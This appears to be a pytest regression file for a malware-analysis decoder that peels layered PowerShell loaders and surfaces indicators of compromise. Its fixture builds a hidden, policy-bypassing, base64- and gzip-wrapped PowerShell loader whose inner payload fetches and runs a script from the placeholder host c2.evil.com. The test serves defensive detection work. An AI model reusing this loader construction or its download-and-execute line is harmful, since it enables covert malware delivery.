"""
Rule R23 · Recursive Multi-Layer Loader Regression
──────────────────────────────────────────────────
Locks the fix for the "output equals input / decoded only one layer"
production bug on the canonical multi-stage PowerShell loader shape:

    CMD launcher (%COMSPEC%)
      → PowerShell -EncodedCommand (UTF-16LE base64)
        → PowerShell loader
          → [Convert]::FromBase64String("…")
            → GZip decompress
              → Recovered PowerShell payload
                → IEX + URL

Every layer MUST be peeled, and the URL from the innermost payload
MUST surface on the SSOT's `iocs[]`.  If a future change breaks the
recursive decoder or the deep-IOC extraction, this test fails.
"""
from __future__ import annotations

import base64
import gzip

from services.die.investigation_results import render
from services.die.preprocessor.recursive_decoder import peel_recursively


TARGET_URL = "http://c2.evil.com/stage2.ps1"


def _build_loader() -> str:
    """Construct the exact loader shape reported by the analyst."""
    inner_ps = f'IEX (New-Object Net.WebClient).DownloadString("{TARGET_URL}"); whoami'
    gz = gzip.compress(inner_ps.encode())
    b64_inner = base64.b64encode(gz).decode()
    ps_loader = (
        f'$s=New-Object IO.MemoryStream(,'
        f'[Convert]::FromBase64String("{b64_inner}"));'
        f'IEX ([IO.StreamReader]::new(New-Object IO.Compression.GZipStream('
        f'$s,[IO.Compression.CompressionMode]::Decompress)).ReadToEnd())'
    )
    b64_outer = base64.b64encode(ps_loader.encode("utf-16-le")).decode()
    return f"%COMSPEC% /b /c start /b /min powershell -w hidden -ep bypass -enc {b64_outer}"


class TestRecursiveLoaderPeeling:
    """The peel loop MUST reach the innermost payload."""

    def test_peel_recursively_reaches_innermost_url(self):
        paste = _build_loader()
        peeled, layers = peel_recursively(paste)
        assert TARGET_URL in peeled, (
            "recursive peel did not reach the innermost payload\n"
            f"peeled tail: {peeled[-200:]!r}\n"
            f"layers: {[l.get('stage') for l in layers]}"
        )

    def test_peel_records_multiple_layers(self):
        peeled, layers = peel_recursively(_build_loader())
        # We expect at least: outer base64 → utf16le → FromBase64String → gzip
        stages = [l["stage"] for l in layers]
        assert len(layers) >= 3, f"expected ≥3 decode layers, got {stages}"

    def test_peel_never_infinite_loops(self):
        # Empty / trivial input must terminate quickly with no layers.
        peeled, layers = peel_recursively("hello world")
        assert peeled == "hello world"
        assert layers == []

    def test_peel_is_deterministic(self):
        paste = _build_loader()
        a, _ = peel_recursively(paste)
        b, _ = peel_recursively(paste)
        assert a == b, "recursive peel is non-deterministic"


class TestRenderSurfacesDeepURL:
    """The full render() must surface the innermost URL on iocs[]
    even though the raw input contains no URL bytes."""

    def test_render_surfaces_url_from_deepest_layer(self):
        out = render(_build_loader())
        iocs = (out["object"].get("iocs") or {})
        urls = []
        if isinstance(iocs, dict):
            urls = list(iocs.get("url") or [])
        else:
            for i in iocs:
                if isinstance(i, dict) and (i.get("kind") or "").lower() == "url":
                    urls.append(i.get("value"))
        assert TARGET_URL in urls, (
            f"URL {TARGET_URL} not surfaced by render()\n"
            f"iocs={iocs}"
        )


class TestWorkspacePipelineSurfacesDeepURL:
    """The WORKSPACE pipeline (`analysis_core.deterministic_best_decode`)
    is the one the analyst actually hits — must also surface the
    innermost URL on multi-layer loaders."""

    def test_workspace_pipeline_decodes_full_loader(self):
        from analysis_core import deterministic_best_decode
        r = deterministic_best_decode(_build_loader())
        output = r.get("output") or ""
        assert TARGET_URL in output, (
            f"WORKSPACE pipeline did not surface {TARGET_URL}\n"
            f"engine={r.get('engine')}  output_tail={output[-300:]!r}"
        )
        iocs = r.get("iocs") or {}
        if isinstance(iocs, dict):
            assert TARGET_URL in (iocs.get("url") or []), (
                f"WORKSPACE iocs.url missing {TARGET_URL}: {iocs}"
            )

    def test_render_records_decode_layers_on_ssot(self):
        out = render(_build_loader())
        perf = (out["object"].get("metadata") or {}).get("performance") or {}
        layers = perf.get("decode_layers") or []
        assert len(layers) >= 3, (
            f"expected ≥3 decode layers on SSOT, got {[l.get('stage') for l in layers]}"
        )
        # Deterministic ordering: outer base64 / utf16le must come
        # before the inner from_base64_string + gzip peel.
        stages = [l["stage"] for l in layers]
        assert any("base64" in s for s in stages), stages
        assert any("gzip"   in s for s in stages) or \
               any("from_base64_string" in s for s in stages), stages

    def test_render_completes_within_r23_budget(self):
        out = render(_build_loader())
        perf = (out["object"].get("metadata") or {}).get("performance") or {}
        backend_ms = perf.get("backend_ms")
        assert backend_ms is not None and backend_ms <= 3000.0, \
            f"backend_ms={backend_ms} > 3000 ms — R23 SLO breach"
